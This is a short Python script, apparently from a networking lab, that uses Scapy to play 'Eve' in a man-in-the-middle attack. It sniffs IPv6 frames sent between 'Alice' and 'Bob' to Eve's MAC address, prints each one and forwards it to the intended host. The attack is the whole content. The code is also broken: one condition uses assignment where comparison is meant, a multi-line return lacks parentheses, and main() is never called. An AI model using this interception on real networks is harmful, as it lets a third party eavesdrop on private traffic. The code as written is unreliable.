from scapy.all import *

# Eve details
EVE_IPv6 = "fe80::82b5:2e0c:405:fead"
EVE_MAC = "08:00:27:18:b4:02"

# Alice details
ALICE_IPv6 = "fe80::43cc:ca2f:ae1f:dbed"
ALICE_MAC = "08:00:27:53:f5:cb"

# Bob details
BOB_IPv6 = "fe80::1eaa:7821:6306:2979"
BOB_MAC = "08:00:27:ab:33:74"

def printConversation(pkt):
    if pkt[Ether].src = ALICE_MAC:
        pkt[Ether].dst = BOB_MAC
    else:
        pkt[Ether].dst = ALICE_MAC
    
    print(pkt.summary())
    sendp(pkt, verbose=0)

def AliceAndBobConnect(pkt):
    return Ether in pkt and IPv6 in pkt and
    ((pkt[Ether].src == ALICE_MAC and
    pkt[Ether].dst == EVE_MAC and
    pkt[IPv6].src == ALICE_IPv6 and
    pkt[IPv6].dst == BOB_IPv6)
    or
    (pkt[Ether].src == BOB_MAC and
    pkt[Ether].dst == EVE_MAC and
    pkt[IPv6].src == BOB_IPv6 and
    pkt[IPv6].dst == ALICE_IPv6))


def main():
    sniff(lfilter=AliceAndBobConnect, prn=printConversation)